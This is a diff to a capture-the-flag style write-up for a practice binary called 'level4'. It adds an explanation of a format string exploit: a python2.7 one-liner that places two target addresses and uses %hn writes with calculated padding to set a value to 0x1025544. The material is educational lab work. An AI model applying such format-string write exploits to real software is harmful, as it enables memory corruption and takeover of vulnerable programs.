@@ -53,7 +53,7 @@ As we can see, i print $eax, the register where is store the value of <m>, and i
 
 ## Write larger data
 
-In asm we see that the program compare $eax with 0x1025544 wich equal 16930116 in decimal.
+In asm we see that the program compare $eax with 0x1025544 which equal 16930116 in decimal.
 
 It will take a day if we decide print the padding with this value, we can eazely split the value.
 
@@ -90,3 +90,15 @@ So final exploit is :
 ```py
 python2.7 -c 'import sys; sys.stdout.write(b"\x10\x98\x04\x08" + b"\x12\x98\x04\x08" + b"%250x" + b"%13$hn" + b"%21570x" + b"%12$hn")' | ./level4
 ```
+
+- `b"\x10\x98\x04\x08"` is the first address.
+- `b"\x12\x98\x04\x08"` is the second address.
+
+so `%12$x` point to first address and `%13$x` to the second.
+
+- `b"%250x"` is the first padding (remember 250 + 8 byte address = 258 = 0x102)
+- `b"%13$hn"` we store 258 inside the second address because its little endian.
+- `b"%21570x"` is the second padding (0x5544 - 0x102)
+- `b"%12$hn"` is the first address, we store the value.
+
+Bingo, `\x10\x98\x04\x08` point to 0x1025544 !
